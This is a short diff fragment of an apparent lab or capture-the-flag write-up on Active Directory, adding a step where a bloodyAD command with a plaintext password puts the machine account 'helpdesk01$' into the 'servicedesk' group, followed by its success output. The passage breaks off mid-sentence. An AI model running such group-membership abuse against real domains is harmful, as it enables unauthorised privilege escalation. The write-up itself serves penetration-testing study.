@@ -295,5 +295,8 @@ I now have full control over the group
 # Adding `helpdesk01$` to `servicedesk` group
 
 ```python
-
+bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u 'helpdesk01$' -p 'Password123' -k add groupMember 'servicedesk' 'helpdesk01$'
+[+] helpdesk01$ added to servicedesk
 ```
+
+I can 
